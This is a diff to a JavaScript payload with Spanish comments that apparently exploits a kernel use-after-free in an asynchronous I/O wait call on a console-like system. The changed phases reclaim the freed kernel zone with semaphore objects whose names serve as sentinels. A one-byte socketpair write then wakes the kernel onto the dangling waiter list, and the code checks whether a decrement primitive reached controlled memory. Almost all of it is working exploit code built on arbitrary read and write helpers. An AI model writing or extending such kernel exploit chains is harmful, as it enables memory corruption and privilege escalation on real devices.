@@ -205,17 +205,26 @@
     say("F3 resultado: " + VS(det) + "  <- si la consola sigue viva, el UAF no panicó");
     for (let i = 0; i < 200; i++) { try { syscall(Y); } catch (e) {} }
 
-    // ===== FASE 4: releer testigos (deteccion del efecto) =====
-    // Reclamar la zona liberada con allocs del mismo tamaño hace que el allocator
-    // reutilice la zona del array liberado; si el UAF es real, el contenido de
-    // los testigos cambia o el kernel escribe sobre ellos.
-    say("F4: reclamar zona liberada y releer testigos");
-    const reclaim1 = malloc(0x70);
-    const reclaim2 = malloc(0x60);
-    for (let i = 0n; i < 0x70n; i += 8n) write64(reclaim1 + i, 0xCAFEBABE00000000n + i);
-    for (let i = 0n; i < 0x60n; i += 8n) write64(reclaim2 + i, 0xFEEDFACE00000000n + i);
+    // ===== FASE 4: reclaim KERNEL-side con osem (zona 128) =====
+    // El array de waiters (0x70, num=2) se libero en la 128 zone del KERNEL.
+    // Solo allocs del kernel pueden reclamarla: osem_create hace
+    // malloc(0x60, M_osem) = 128 zone (misma zona, segun la spec). Los nombres
+    // llevan centinela: si el waker decrementa [node[0]] y node[0] apunta al
+    // nombre del osem, el primer dword del string cambia (legible desde JS).
+    say("F4: reclaim kernel (osem_create x4, zona 128)");
+    const osemIds = [];
+    const osemNames = [];
+    for (let i = 0; i < 4; i++) {
+        const tag = "WAKE000" + i;
+        const nmp = alloc_string(tag);
+        const orig = read64(nmp);
+        osemNames.push({ tag, ptr: nmp, orig });
+        const q = SC("OSEM_CREATE", 0x225n, [nmp, 0n, 1n, 1n, 0n], "(reclaim " + tag + ")");
+        if (q.r >= 0n) osemIds.push(q.r);
+    }
     for (let i = 0; i < 500; i++) { try { syscall(Y); } catch (e) {} }
 
+    // Relectura de testigos de proceso (informativos; el reclaim real es kernel)
     const HXWIT2 = (b, n) => { let x = ""; for (let i = 0n; i < BigInt(n); i += 8n) x += read64(b + i).toString(16) + " "; return x; };
     let witChanged = false, osemChanged = false;
     {
@@ -226,29 +235,58 @@
         for (let i = 0n; i < BigInt(OSEM_BYTES); i += 8n, k++)
             if (read64(osemWit + i) !== osemSnap[k]) osemChanged = true;
     }
-    const refcntNow = Number(read32(osemWit + 0x54n));
-
     say("F4 post witness: " + HXWIT2(witness, 0x20));
-    say("F4 post osemWit: " + HXWIT2(osemWit, 0x20) + "... refcnt=" + refcntNow);
-    say("F4 refcnt cambio: " + (refcntNow !== 2 ? "SI (" + refcntNow + ")" : "no"));
+    say("F4 post osemWit: " + HXWIT2(osemWit, 0x20));
 
-    // ===== FASE 5: veredicto + limpieza =====
-    say("F5: limpieza");
+    // ===== FASE 5: WAKE - completar las lecturas pendientes =====
+    // El waker (0x805c1d2d: write + mtx_lock + dec x2) corre al COMPLETARSE
+    // una request. Escribimos 1 byte al otro extremo del socketpair -> las
+    // lecturas pendientes se completan -> el kernel recorre req->waiters
+    // (colgando en la zona liberada/reclamada) y ejecuta el primitivo.
+    say("F5: WAKE - write(1B) al otro extremo para completar las lecturas");
+    const wakeBuf = malloc(4);
+    write8(wakeBuf, 0x57); // 'W'
+    let woken = "sin fd";
+    if (fdPair >= 0n) {
+        const qw = SC("WAKE_WRITE", 0x4n, [fdPair, wakeBuf, 1n], "(fdB,1 byte)");
+        woken = VS(qw);
+    }
+    say("F5 wake=" + woken + " <- si aqui hay panic/cuelgue, el waker toco el nodo colgante");
+    for (let i = 0; i < 500; i++) { try { syscall(Y); } catch (e) {} }
+
+    // ===== FASE 6: deteccion del efecto =====
+    const nameChanges = [];
+    for (const nm of osemNames) {
+        try {
+            const now = read64(nm.ptr);
+            if (now !== nm.orig) nameChanges.push(nm.tag + "=" + FX(now));
+        } catch (e) { nameChanges.push(nm.tag + "=FAULT"); }
+    }
+    const post1 = read64(decTarget1), post2 = read64(decTarget2);
+    const decHit = (post1 !== 0x4141414141414141n) || (post2 !== 0x4242424242424242n);
+
+    say("F6 name strings: " + (nameChanges.length ? nameChanges.join(" ") : "sin cambios"));
+    say("F6 decTargets: " + FX(post1) + " / " + FX(post2));
+    say("F6 arena testigos: wit=" + witChanged + " osemWit=" + osemChanged);
+
+    // ===== FASE 7: veredicto + limpieza =====
+    let v;
+    if (det.ex) v = "FALLO: aio_multi_wait mode0 THREW (" + det.msg + ")";
+    else if (det.r < 0n && det.e === 78) v = "aio_multi_wait ENOSYS -> no existe en este sandbox";
+    else if (decHit) v = "PRIMITIVO VIVO: dec alcanzo decTargets (dec1=" + FX(post1) + " dec2=" + FX(post2) + ")";
+    else if (nameChanges.length) v = "EFECTO EN OBJETOS KERNEL: " + nameChanges.join(" ");
+    else if (witChanged || osemChanged) v = "EFECTO DETECTADO en testigos arena";
+    else v = "sin efecto observable (UAF latente, waker no alcanzo memoria controlada)";
+    say("VERDICT: " + v);
+    notif(("bagagwa: " + v).slice(0, 120));
+    // Limpieza. OJO: los osem de reclaim se dejan VIVOS a proposito — si el
+    // waker toco su refcount, osem_delete seria un double-free.
     SC("AIO_MULTI_CANCEL", A_CANCEL, [ids, B(NREQ), states], "(ids,N,states)");
     SC("AIO_MULTI_DELETE", A_DEL, [ids, B(NREQ), states], "(ids,N,states)");
     if (fdTarget > 0n) { try { syscall(SYSCALL.close, fdTarget); } catch (e) {} }
     if (fdPair >= 0n) { try { syscall(SYSCALL.close, fdPair); } catch (e) {} }
-
-    const post1 = read64(decTarget1), post2 = read64(decTarget2);
-    const decHit = (post1 !== 0x4141414141414141n) || (post2 !== 0x4242424242424242n);
-    let v;
-    if (det.ex) v = "FALLO: aio_multi_wait mode0 THREW (" + det.msg + ")";
-    else if (det.r < 0n && det.e === 78) v = "aio_multi_wait ENOSYS -> no existe en este sandbox";
-    else if (decHit) v = "PRIMITIVO VIVO: dec alcanzo el objetivo (dec1=" + FX(post1) + " dec2=" + FX(post2) + ")";
-    else if (witChanged || osemChanged) v = "EFECTO DETECTADO en testigos (wit=" + witChanged + " osem=" + osemChanged + " refcnt=" + refcntNow + ")";
-    else v = "mode0 retorno " + VS(det) + " sin efecto observable en testigos (UAF latente/invisible)";
-    say("VERDICT: " + v);
-    notif(("bagagwa: " + v).slice(0, 120));
+    say("osem de reclaim dejados vivos (double-free safety): "
+        + osemIds.map((i) => FX(i)).join(","));
     for (let i = 0; i < 8; i++) { notif(("bagagwa: " + v).slice(0, 100)); for (let j = 0; j < 1000; j++) { try { syscall(Y); } catch (e) {} } }
     say("PAYLOAD DONE");
 })();
